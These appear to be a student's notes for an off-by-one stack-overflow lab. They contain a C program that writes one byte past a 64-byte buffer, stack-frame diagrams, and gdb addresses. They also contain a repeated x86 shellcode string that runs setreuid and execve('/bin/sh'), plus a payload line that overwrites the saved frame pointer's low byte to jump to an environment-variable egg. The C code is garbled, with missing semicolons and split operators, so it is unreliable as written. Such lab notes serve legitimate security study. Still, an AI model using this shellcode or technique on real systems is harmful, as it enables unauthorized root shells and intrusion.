# trololo

# include <stdio.h>
# include <stdlib.h>
# include <string.h>

void flip(char * buf, const char * input) {
    size_t n = strlen(input)
    int i
    for (i=0
         i < n & & i <= 64
         + +i)
    buf[i] = input[i] ^ 0x20

    while (i < 64)
    buf[i++] = '\0'
}

# every byte is XOR with 20

void invoke(const char * in) {
    char buf[64]
    flip(buf, in )
    puts(buf)
}

void dispatch(const char * in) {
    invoke(in )
}

int main(int argc, char * argv[]) {
    if (argc != 2)
    return 1

    dispatch(argv[1])
    return 0
}

[??] environ variable egg
[??] Output of egg?
# _____main____
[4] RIP main
[4] SFP main
[?] arguments
# _____dispatch___
[4] RIP main
[4] SFP main
[?] arguments
# ______invoke______
[4] RIP invoke
[4] SFP invoke
[64] buf

# ______flip______
[4] RIP flip
[4] SFP flip
[n] compiler padding
[?] size_t n
[4] int i

# inside main
# SFPa at 0xffffd668

# RIP at 0xffffd66c
#value: 0x804946f

# inside the flip function
# sfp at 0xffffd600

# rip at 0xffffd604
#value: 0x804925d


# Questions
# Cannot find the address of the environmental variable
# Which SFP is the hard one?
#Difference in shellcodes in arg and egg


# Environment variable address:
$1 = (char **) 0xffffd6f0
$2 = 0xffffd7f2 "SHLVL=1"
$3 = 0xffffd7fa "PAD=", '\377' < repeats 196 times > ...
$4 = 0xffffdfb7 "TERM=screen"
$5 = 0xffffdfc3 "SHELL=/bin/sh"
$6 = 0xffffdfd1 "EGG="
$7 = 0xffffdfd6 "PWD=/home/vega"
0xffffdfaa
\
'\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a' + \
    '\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f' + \
    '\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50' + \
    '\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

\
'\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a' + \
    '\x47\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f' + \
    '\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50' + \
    '\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'


# notes
# Overwrite all of buff (64) plus the least signifance byte of buf, which is the last byte in sfp


sfp at 0xffffd650
rip at 0xffffd654
value at sfp: 0xffffd65c

saved rip = 0x804927a

another sfp:
0xffffd5f0

another sfp value...?
0xffffd5fc

buf: value = 0x804c140

0xffffdfaa

ff ff df 8a

EGG = 0xffffdfaa - -> +4 & XOR - -> ff ff df 8e

ff ff df ae
- -> byte by byte
df df ff 8e

print('\x8e\xff\xdf\xdf'*16+'\x90')

buf beginning address 0xffffd5b0
